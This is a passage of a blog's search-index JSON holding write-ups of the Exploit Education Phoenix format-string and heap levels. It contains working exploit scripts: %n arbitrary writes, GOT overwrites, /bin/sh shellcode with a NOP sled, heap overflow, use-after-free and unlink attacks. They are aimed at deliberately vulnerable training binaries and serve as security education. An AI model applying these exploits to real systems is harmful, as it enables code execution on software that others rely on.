","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/format-two/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Format Three",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int changeme;  void bounce(char *str) {   printf(str); }  int main(int argc, char **argv) {   char buf[4096];   printf(\"%s\\n\", BANNER);    if (read(0, buf, sizeof(buf) - 1) &lt;= 0) {     exit(EXIT_FAILURE);   }    bounce(buf);    if (changeme == 0x64457845) {     puts(\"Well done, the 'changeme' variable has been changed correctly!\");   } else {     printf(         \"Better luck next time - got 0x%08x, wanted 0x64457845!\\n\", changeme);   }    exit(0); }   This level has the same issue as the previous one so we will solve the 32bit version.   The goal of this level is to write a specific value 0x64457845 to changeme.   $ gdb -q /opt/phoenix/i486/format-three  Reading symbols from /opt/phoenix/i486/format-three...(no debugging symbols found)...done.  gef➤  disassemble main  Dump of assembler code for function main: .....    0x08048551 &lt;+85&gt;:\tcall   0x80484e5 &lt;bounce&gt;    0x08048556 &lt;+90&gt;:\tadd    esp,0x10    0x08048559 &lt;+93&gt;:\tmov    eax,ds:0x8049844    0x0804855e &lt;+98&gt;:\tcmp    eax,0x64457845 .....   The address of changeme is 0x8049844.   Now to get the offset of the input:   $ /opt/phoenix/i486/format-three  Welcome to phoenix/format-three, brought to you by https://exploit.education AAAA%x %x %x %x %x %x %x %x %x %x %x %x %x %x AAAA0 0 0 f7f81cf7 f7ffb000 ffffd708 8048556 ffffc700 ffffc700 fff 0 41414141 25207825 78252078   We can see our input 41414141 which is AAAA at offset 12.   Now to write to changeme address we will write byte by byte, so first we enter the four bytes of changeme address.   changeme = 0x8049844  buff = \"\" buff += p32(changeme+0) buff += p32(changeme+1) buff += p32(changeme+2) buff += p32(changeme+3)   Then we enter the offset  which is %x * 11  (remember that the input is at offset 12).   And finally we write to memory with %n.   buff += \"%x \" * 11 buff += \"%n\"    $ python solve.py | /opt/phoenix/i486/format-three  Welcome to phoenix/format-three, brought to you by https://exploit.education DEFG0 0 0 f7f81cf7 f7ffb000 ffffd708 8048556 ffffc700 ffffc700 fff 0  Better luck next time - got 0x00000051, wanted 0x64457845!   We could successfully write to first byte of changeme but the value written is 0x51 and we need 0x45 :(   To overcome this issue we write 0x145 instead of 0x45 (we can only go up).   We already have 0x51 so to reach 0x145 we need 244 bytes more (0x145 - 0x51).   buff += \"%x \" * 11 buff += 'A' * 244 buff += \"%n\"   $ python solve.py | /opt/phoenix/i486/format-three  Welcome to phoenix/format-three, brought to you by https://exploit.education DEFG0 0 0 f7f81cf7 f7ffb000 ffffd708 8048556 ffffc700 ffffc700 fff 0  Better luck next time - got 0x00000145, wanted 0x64457845!   Bytes_written_until_now = 0x145   The next byte needs to be 0x78  and we have 0x145 (remember we can only go up) so we will write 0x178 instead.   bytes needed = 0x178 - 0x145 = 51 junk bytes.   buff += 'A' * 51 buff += \"%n\"   Bytes_written_until_now = 0x178   The third byte needs to be 0x45 and we have 0x178 so will write 0x245 (0x145 will give negative number).   bytes needed = 0x245 - 0x178 = 205 junk bytes.   buff += 'A' * 205 buff += \"%n\"   Bytes_written_until_now = 0x245   The last byte need to be 0x64 and we have 0x245 so we will write 0x264.   bytes needed = 0x264 - 0x245 = 31 junk bytes.   buff += 'A' * 31 buff += \"%n\"   And that’s it, a bit tedious process :)   Solution:   # solve.py  from pwn import *  changeme = 0x8049844  buff = \"\" buff += p32(changeme+0) buff += p32(changeme+1) buff += p32(changeme+2) buff += p32(changeme+3)  buff += '%x ' * 11      # offset to first byte  buff += 'A' * 244       # JUNK buff += \"%n\"            # write to first byte  buff += 'A' * 51        # JUNK buff += \"%n\"            # write to second byte  buff += 'A' * 205       # JUNK buff += \"%n\"            # write to third byte  buff += 'A' * 31        # JUNK buff += \"%n\"            # write to forth byte  print(buff)   $ python solve.py | /opt/phoenix/i486/format-three  Welcome to phoenix/format-three, brought to you by https://exploit.education DEFG0 0 0 f7f81cf7 f7ffb000 ffffd708 8048556 ffffc700 ffffc700 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Well done, the 'changeme' variable has been changed correctly!  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/format-three/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Format Four",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  void bounce(char *str) {   printf(str);   exit(0); }  void congratulations() {   printf(\"Well done, you're redirected code execution!\\n\");   exit(0); }  int main(int argc, char **argv) {   char buf[4096];    printf(\"%s\\n\", BANNER);    if (read(0, buf, sizeof(buf) - 1) &lt;= 0) {     exit(EXIT_FAILURE);   }    bounce(buf); }   The idea of this level is the same as the previous one but instead of overwriting a variable we overwrite the GOT.   GOT is the global offset table and is it’s used to find the addresses of external functions at runtime.   So we can use format string vulnerability to overwrite the address of exit after the vulnerable printf to point point to anything (congratulations function in this case).   To get exit address we can use objdump:   $ objdump -R /opt/phoenix/i486/format-four  /opt/phoenix/i486/format-four:     file format elf32-i386  DYNAMIC RELOCATION RECORDS OFFSET   TYPE              VALUE  080497d8 R_386_JUMP_SLOT   printf 080497dc R_386_JUMP_SLOT   puts 080497e0 R_386_JUMP_SLOT   read 080497e4 R_386_JUMP_SLOT   exit 080497e8 R_386_JUMP_SLOT   __libc_start_main   Great, now we now it’s at 080497e4.   Let’s overwrite this address with congratulations address.   I won’t go through the code details as this is the same technique used in the previous level.   Solution:   # solve.py  from pwn import *  exit = 0x080497e4 congratulations = 0x08048503  buff = \"\" buff += p32(exit+0) buff += p32(exit+1) buff += p32(exit+2) buff += p32(exit+3)  buff += '%x ' * 11      # offset to first byte  buff += 'A' * 178       # JUNK buff += \"%n\"            # write to first byte  buff += 'A' * 130       # JUNK buff += \"%n\"            # write to second byte  buff += 'A' * 127       # JUNK buff += \"%n\"            # write to third byte  buff += 'A' * 4         # JUNK buff += \"%n\"            # write to forth byte  print(buff)   $ python solve.py | /opt/phoenix/i486/format-four Welcome to phoenix/format-four, brought to you by https://exploit.education 0 0 0 f7f81cf7 f7ffb000 ffffd708 804857d ffffc700 ffffc700 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Well done, you're redirected code execution! Well done, you're redirected code execution! Well done, you're redirected code execution! .......   We will go through an infinite loop because we overwrote the exit address but who cares, we redirected code execution and that’s what matters :)   Bonus:   We can go further and get write a shellcode to buffer then jump to it, let’s do that.   We will add some NOPs to our exploit to add some flexibility to the jump address.   # solve2.py  from pwn import *  exit = 0x080497e4 buffer = 0xffffc710  shellcode = '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'  buff = \"\" buff += p32(exit+0) buff += p32(exit+1) buff += p32(exit+2) buff += p32(exit+3)  buff += '\\x90' * 100\t\t# NOP sled buff += shellcode  buff += '%x ' * 11\t\t# offset to first byte  buff += 'A' * 127\t\t# JUNK buff += \"%n\"\t\t\t# write to first byte  buff += 'A' * 119\t\t# JUNK buff += \"%n\"\t\t\t# write to second byte  buff += 'A' * 56\t\t# JUNK buff += \"%n\"\t\t\t# write to third byte  buff += 'A' * 256\t\t# JUNK buff += \"%n\"\t\t\t# write to forth byte  print(buff)   $ (python solve2.py; cat) | /opt/phoenix/i486/format-four Welcome to phoenix/format-four, brought to you by https://exploit.education ����������������������������������������������������������������������������������������������������1�Ph//shh/bin����°                                                                                                                       1�@̀0 0 0 f7f81cf7 f7ffb000 ffffd708 804857d ffffc700 ffffc700 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA whoami phoenix-i386-format-four  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/format-four/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Heap Zero",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  struct data {   char name[64]; };  struct fp {   void (*fp)();   char __pad[64 - sizeof(unsigned long)]; };  void winner() {   printf(\"Congratulations, you have passed this level\\n\"); }  void nowinner() {   printf(       \"level has not been passed - function pointer has not been \"       \"overwritten\\n\"); }  int main(int argc, char **argv) {   struct data *d;   struct fp *f;    printf(\"%s\\n\", BANNER);    if (argc &lt; 2) {     printf(\"Please specify an argument to copy :-)\\n\");     exit(1);   }    d = malloc(sizeof(struct data));   f = malloc(sizeof(struct fp));   f-&gt;fp = nowinner;    strcpy(d-&gt;name, argv[1]);    printf(\"data is at %p, fp is at %p, will be calling %p\\n\", d, f, f-&gt;fp);   fflush(stdout);    f-&gt;fp();    return 0; }   To learn more about heap exploitation, see the references at the end.   We will work with the 32bit binaries for the heap levels because the 64bit binaries have some addresses issues.   This code allocates two memory chunks and stores them in d and f so f is after d in the heap, then it uses strcpy to copy argv[1] to d-&gt;name but with out size checking, a classic overflow.   So if our input is large enough we can overwrite the value of f-&gt;fp to point to winner function.   Let’s run the program:   $ /opt/phoenix/i486/heap-zero AAAA Welcome to phoenix/heap-zero, brought to you by https://exploit.education data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x804884e level has not been passed - function pointer has not been overwritten   The offset between data and fp = 0xf7e69050 - 0xf7e69008 = 72 bytes.   Lets’t get the address of winner function:   $ objdump -t /opt/phoenix/i486/heap-zero | grep winner 0804884e g     F .text\t00000019 nowinner 08048835 g     F .text\t00000019 winner   winner function is at  0x08048835.   Solution:   $ /opt/phoenix/i486/heap-zero $(python -c \"print 'A'*72 + '\\x35\\x88\\x04\\x08'\") Welcome to phoenix/heap-zero, brought to you by https://exploit.education data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x8048835 Congratulations, you have passed this level   References:   https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/   https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/heap-zero/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Heap One",
        "excerpt":"#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;time.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  struct heapStructure {   int priority;   char *name; };  int main(int argc, char **argv) {   struct heapStructure *i1, *i2;    i1 = malloc(sizeof(struct heapStructure));   i1-&gt;priority = 1;   i1-&gt;name = malloc(8);    i2 = malloc(sizeof(struct heapStructure));   i2-&gt;priority = 2;   i2-&gt;name = malloc(8);    strcpy(i1-&gt;name, argv[1]);   strcpy(i2-&gt;name, argv[2]);    printf(\"and that's a wrap folks!\\n\"); }  void winner() {   printf(       \"Congratulations, you've completed this level @ %ld seconds past the \"       \"Epoch\\n\",       time(NULL)); }   This code uses strcpy without size checking just like the previous level, but there is not function pointer here to overwrite.   Let’s look at the memory layout, remember that malloc returns the allocation address in eax so we can set breakpoints after each call to get i1 and i2 addresses (also these two addresses are stored at ebp-0xc and ebp-0x10).   $ gdb -q /opt/phoenix/i486/heap-one Reading symbols from /opt/phoenix/i486/heap-one...(no debugging symbols found)...done.  gef➤  b *0x08048883 Breakpoint 1 at 0x8048883  gef➤  r AAAA BBBB Starting program: /opt/phoenix/i486/heap-one AAAA BBBB Breakpoint 1, 0x08048883 in main ()  gef➤  x/xw $ebp-0xc 0xffffd6fc:\t0xf7e69008  gef➤  x/xw $ebp-0x10 0xffffd6f8:\t0xf7e69028  gef➤  x/12xw 0xf7e69008 0xf7e69008:\t0x00000001\t0xf7e69018\t0x00000000\t0x00000011 0xf7e69018:\t0x41414141\t0x00000000\t0x00000000\t0x00000011 0xf7e69028:\t0x00000002\t0xf7e69038\t0x00000000\t0x00000011  gef➤  x/12xw 0xf7e69028 0xf7e69028:\t0x00000002\t0xf7e69038\t0x00000000\t0x00000011 0xf7e69038:\t0x42424242\t0x00000000\t0x00000000\t0x000fffc1 0xf7e69048:\t0x00000000\t0x00000000\t0x00000000\t0x00000000   We can see that i1 is at 0xf7e69008, first value priority is 0x1 and second value is name address returned from malloc(8) which is 0xf7e69018 and we can see that strcpy is writing to that address.   So if we overflow i1 to write to name address of i2 we can overwrite any value in memory with the value of argv[2], but what to overwrite ???   gef➤  disassemble main  Dump of assembler code for function main:    0x0804887e &lt;+169&gt;:\tpush   0x804ab70 =&gt; 0x08048883 &lt;+174&gt;:\tcall   0x80485b0 &lt;puts@plt&gt;    0x08048888 &lt;+179&gt;:\tadd    esp,0x10   You guessed it (I hope), we will overwrite the GOT entry of the puts function to point to winner function.   $ objdump -R /opt/phoenix/i486/heap-one | grep puts 0804c140 R_386_JUMP_SLOT   puts  $ objdump -t /opt/phoenix/i486/heap-one | grep winner 0804889a g     F .text\t00000027 winner   puts is at 0x0804c140 and winner is at 0x0804889a, and the needed offset = 0xf7e6902c - 0xf7e69018 = 20 bytes.   Note that in the assembly, winner function uses printf not puts so we can safely overwrite puts function.   Solution:   $ /opt/phoenix/i486/heap-one $(python -c \"print 'A'*20 + '\\x40\\xc1\\x04\\x08'\") $(python -c \"print '\\x9a\\x88\\x04\\x08'\") Congratulations, you've completed this level @ 1580310733 seconds past the Epoch  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/heap-one/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Heap Two",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  struct auth {   char name[32];   int auth; };  struct auth *auth; char *service;  int main(int argc, char **argv) {   char line[128];    printf(\"%s\\n\", BANNER);    while (1) {     printf(\"[ auth = %p, service = %p ]\\n\", auth, service);      if (fgets(line, sizeof(line), stdin) == NULL) break;      if (strncmp(line, \"auth \", 5) == 0) {       auth = malloc(sizeof(struct auth));       memset(auth, 0, sizeof(struct auth));       if (strlen(line + 5) &lt; 31) {         strcpy(auth-&gt;name, line + 5);       }     }     if (strncmp(line, \"reset\", 5) == 0) {       free(auth);     }     if (strncmp(line, \"service\", 6) == 0) {       service = strdup(line + 7);     }     if (strncmp(line, \"login\", 5) == 0) {       if (auth &amp;&amp; auth-&gt;auth) {         printf(\"you have logged in already!\\n\");       } else {         printf(\"please enter your password\\n\");       }     }   } }   The is a classic use-after-free (UAF) exploit, if we enter “auth AAAA” the code allocates memory and stores it in auth then copies the name AAAA to auth-&gt;name, so far so good.   To login we need auth to point to a memory address and auth-&gt;auth not to be zero, we can’t overflow name since there is a length checking strlen.   The bug here is that reset frees auth allocated memory but auth still points to that memory location which could contain anything, auth here is called a dangling pointer.   The way strdup function works is it uses malloc under the hood to allocate memory for a new string, and the way malloc works (in very little details) is that it first looks if there is a previously-freed chunk of  memory, and that chunk is big enough to service the request, it will use that freed chunk for the new allocation.   So if we allocated memory for auth, freed that memory then entered service the strdup function will use the previously freed memory address of auth, and now we can write anything to auth-&gt;auth (we are writing to service but auth points to that address already).   The goal here is only to change auth-&gt;auth to any thing so we will just use some junk.   user@phoenix-amd64:~$ gdb -q /opt/phoenix/i486/heap-two Reading symbols from /opt/phoenix/i486/heap-two...(no debugging symbols found)...done.  gef➤  disassemble main Dump of assembler code for function main: .....    0x080487e4 &lt;+367&gt;:\tmov    eax,ds:0x8049adc    0x080487e9 &lt;+372&gt;:\tmov    eax,DWORD PTR [eax+0x20]    0x080487ec &lt;+375&gt;:\ttest   eax,eax .....  gef➤  b *0x080487e9 Breakpoint 1 at 0x80487e9  gef➤  r Starting program: /opt/phoenix/i486/heap-two   Welcome to phoenix/heap-two, brought to you by https://exploit.education [ auth = 0, service = 0 ] auth AAAA [ auth = 0x8049af0, service = 0 ] reset  [ auth = 0x8049af0, service = 0 ] serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB [ auth = 0x8049af0, service = 0x8049af0 ] login   Breakpoint 1, 0x080487e9 in main ()  gef➤  x/xw $eax+0x20 0x8049b10:\t0x42424242\t\t# value of auth-&gt;auth  gef➤  c Continuing. you have logged in already! [ auth = 0x8049af0, service = 0x8049af0 ]   Solution:   $ /opt/phoenix/i486/heap-two  Welcome to phoenix/heap-two, brought to you by https://exploit.education [ auth = 0, service = 0 ] auth AAAA [ auth = 0x8049af0, service = 0 ] reset  [ auth = 0x8049af0, service = 0 ] serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB [ auth = 0x8049af0, service = 0x8049af0 ] login  you have logged in already!  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/heap-two/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Heap Three",
        "excerpt":"#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;time.h&gt; #include &lt;unistd.h&gt;  void winner() {   printf(\"Level was successfully completed at @ %ld seconds past the Epoch\\n\",       time(NULL)); }  int main(int argc, char **argv) {   char *a, *b, *c;    a = malloc(32);   b = malloc(32);   c = malloc(32);    strcpy(a, argv[1]);   strcpy(b, argv[2]);   strcpy(c, argv[3]);    free(c);   free(b);   free(a);    printf(\"dynamite failed?\\n\"); }   This level is by far the hardest one and I learned a lot from it, I really encourage you to read through the references before reading the writeup if you don’t know how the heap works.   The code first allocates 3 memory chunks, copies arguments to them then free the allocated memory. The bug here is the use of strcpy without size checking so we can overflow the heap.   Every heap chunk will look like this:    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- Chunk start  |     PREV_SIZE (if P = 0)  |  +-----------------+-+-+-+-+-+  |     CHUNK SIZE      |A|M|P|  +-----------------+-+-+-+-+-+ &lt;-- Pointer returned by malloc  |     USER DATA             |  +---------------------------+ &lt;-- Chunk end   An allocated chunk consists of 3 parts. Two of them being 8 byte or 4 byte headers on 64bit/32bit systems respectively. The third chunk is the user data.   The first byte is the size of the previous chunk and it’s only set if the previous chunk if free.   The second part chunk size is 16 bytes padded, so the last 3 bits are used as flags or properties (Arena bit │  MMAPed bit │ Previous in-use bit), I won’t go into details here.   $ gdb -q /opt/phoenix/i486/heap-three  Reading symbols from /opt/phoenix/i486/heap-three...(no debugging symbols found)...done.  gef➤  disassemble main  Dump of assembler code for function main: .....    0x0804887d &lt;+129&gt;:\tcall   0x8048560 &lt;strcpy@plt&gt;    0x08048882 &lt;+134&gt;:\tadd    esp,0x10    0x08048885 &lt;+137&gt;:\tsub    esp,0xc    0x08048888 &lt;+140&gt;:\tpush   DWORD PTR [ebp-0x14]    0x0804888b &lt;+143&gt;:\tcall   0x8049857 &lt;free&gt; .....  gef➤  b *0x08048882 Breakpoint 1 at 0x8048882  gef➤  r AAAAAAAAAA BBBBBBBBBBB CCCCCCCCCCC Starting program: /opt/phoenix/i486/heap-three AAAAAAAAAA BBBBBBBBBBB CCCCCCCCCCC Breakpoint 1, 0x08048882 in main ()  gef➤  info proc mappings process 324 Mapped address spaces: \tStart Addr   End Addr       Size     Offset objfile \t 0x8048000  0x804c000     0x4000        0x0 /opt/phoenix/i486/heap-three \t 0x804c000  0x804d000     0x1000     0x3000 /opt/phoenix/i486/heap-three \t0xf7e69000 0xf7f69000   0x100000        0x0\t\t======&gt; This is the heap .....  gef➤  x/28xw 0xf7e69000 0xf7e69000:\t0x00000000\t0x00000029\t0x41414141\t0x41414141 0xf7e69010:\t0x00004141\t0x00000000\t0x00000000\t0x00000000 0xf7e69020:\t0x00000000\t0x00000000\t0x00000000\t0x00000029 0xf7e69030:\t0x42424242\t0x42424242\t0x00424242\t0x00000000 0xf7e69040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0xf7e69050:\t0x00000000\t0x00000029\t0x43434343\t0x43434343 0xf7e69060:\t0x00434343\t0x00000000\t0x00000000\t0x00000000   As you can see each chunk has two words before it’s content (prev_size and chunk_size), 0x29 = 101001 and we said the last 3 bits are flags so the real size is 0x28 and the last bit is set indicating the the previous chunk is in use.   When we free these chunks they go to something called bins to be reused later by malloc if we need to allocate new memory. The heap manager first checks the size of the chunk and if its size is &lt;= (80 * SIZE_SZ / 4) which is 80 on 32-bit machine, 160 on 64-bit machine, The chunk will will be will be treated as fastbin.   Fast bins are singly linked list of free memory chunks, every chunk points to the next fast bin using the FD (forward pointer) which is written at the first word of the chunk.   Fast bins:    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- Chunk start  |     PREV_SIZE (if P = 0)  |  +-----------------+-+-+-+-+-+  |     CHUNK SIZE      |A|M|P|  +-----------------+-+-+-+-+-+ &lt;-- Pointer returned by malloc  |     FD pointer            |  +-----------------+-+-+-+-+-+  |     Unused Space          |  +---------------------------+ &lt;-- Chunk end   Let’s check our chunks after they got freed:   gef➤  b *0x080488b2 Breakpoint 2 at 0x80488b2  gef➤  c Continuing.  gef➤  x/28xw 0xf7e69000 0xf7e69000:\t0x00000000\t0x00000029\t0xf7e69028\t0x41414141 0xf7e69010:\t0x00004141\t0x00000000\t0x00000000\t0x00000000 0xf7e69020:\t0x00000000\t0x00000000\t0x00000000\t0x00000029 0xf7e69030:\t0xf7e69050\t0x42424242\t0x00424242\t0x00000000 0xf7e69040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0xf7e69050:\t0x00000000\t0x00000029\t0x00000000\t0x43434343 0xf7e69060:\t0x00434343\t0x00000000\t0x00000000\t0x00000000   As you can see, The first word of chunk b points to chunk c and first word of chunk a points to b. we can see that in the code from malloc-2.7.2.c implementation (free function):   if ((CHUNK_SIZE_T)(size) &lt;= (CHUNK_SIZE_T)(av-&gt;max_fast) &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)) {     set_fastchunks(av);     fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);\t\t// get forward bin     p-&gt;fd = *fb;\t\t\t\t\t// FD of current bin = fb     *fb = p;\t\t\t\t\t\t// fb = current bin }   The exploit here is in this version of malloc is in the unlink macro which is used to consolidate continuous free memory chunks together in one big chunk.   +-------+       +-------+     +-------+ |CHUNK 1|       |CHUNK P|     |CHUNK 3| +-------+       +-------+     +-------+    |  FD   |------&gt;|  FD   |----&gt;|  FD   | +-------+       +-------+     +-------+    |  BK   |&lt;------|  BK   |&lt;----|  BK   | +-------+       +-------+     +-------+                ,-\\-------/. ,-&gt;+-------+  | +\\-----/+ `--&gt;+-------+ |  |CHUNK 1|  | |C\\UNK/P|     |CHUNK 3| |  +-------+  | +--\\-/--+     +-------+    |  |  FD   |--´ |  FX   |     |  FD   | |  +-------+    +--/-\\--+     +-------+    |  |  BK   |    | /BK \\ |  ,--|  BK   | |  +-------+    +/-----\\+  |  +-------+  `--------------/-------\\--+   The problem here is that unlink is not used with fastbins so we need to overwrite the size of a chunk to fool the heap manager into thinking that it’s not a fastbin (unsorted bin in this case).   Let’s see first how unlock works:   #define  unlink(P, BK, FD) {   FD = P-&gt;fd;                                                             BK = P-&gt;bk;                                                             FD-&gt;bk = BK;                                                            BK-&gt;fd = FD;                                                          }   Forward Pointer FD is at offset 8 of a free chunk (after the prev_size and chunk_size), and Backward Pointer BK is at offset 12 (after FD pointer).   so the last two lines can be translated as:   [FD + 12] = BK [BK + 8] = FD   Great, Now we can write to arbitrary memory but where to write ?? we must choose two addresses as FD and BK and the two of them must be in writable memory regions.   FD can be the GOT entry of puts function which is called at the end of the code, GOT is writable so no problems here.   Remember the goal of this level is to call winner function so we can choose BK as the address of winner, the problem is that it’s address is at the .text section which isn’t writable :(   A workaround here is to write a shellcode to a writable memory region and that shellcode will jump to winner function, and the best place to write our shellcode is the heap itself (at any of the 3 chunks).   The last bit of the puzzle is to choose the chunk to overwrite it’s size to be unsorted bin instead of fast bin, we will choose chunk c.   This is the code that will be executed if not a fastbin:   nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk);  /* consolidate backward */ if (!prev_inuse(p)) {\t\t\t\t\t// if the previous chunk is not in use (free)     prevsize = p-&gt;prev_size;\t\t\t\t// get previous size of current chunk     size += prevsize;     p = chunk_at_offset(p, -((long) prevsize));\t\t// add the prevsize to current position to get to the previous chunk     unlink(p, bck, fwd);\t\t\t\t// unlink the previous chunk (throw it away) }  if (nextchunk != av-&gt;top) {\t\t\t\t\t// if the current chunk is not the top of the heap     /* get and clear inuse bit */     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\t// check if next chunk is in use (not free)     set_head(nextchunk, nextsize);      /* consolidate forward */     if (!nextinuse) {\t\t\t\t\t\t// if next chunk is not in use (free)         unlink(nextchunk, bck, fwd);\t\t\t\t// unlink the next chunk (throw it away)         size += nextsize;     }     ..... }    We need just on consolidation (one unlink) to write to GOT, so we will adjust our exploit to use the backward consolidation.   Chunk c:   0xf7e69050:\t0xfffffffc\t0x00000029\t0x00000000\t0x43434343 0xf7e69060:\t0x00434343\t0x00000000\t0x00000000\t0x00000000   For prevsize we will write 0xfffffffc = -4 to jump to 0xf7e69050+4 = 0xf7e69054 which will be the start of previous chunk.   Now unlink will look for FD  at 0xf7e69054 + 8 = 0xf7e6905c and BK 0xf7e69054 + 12 = 0xf7e69060, so we will write those addresses there.   FD will be puts_address-12 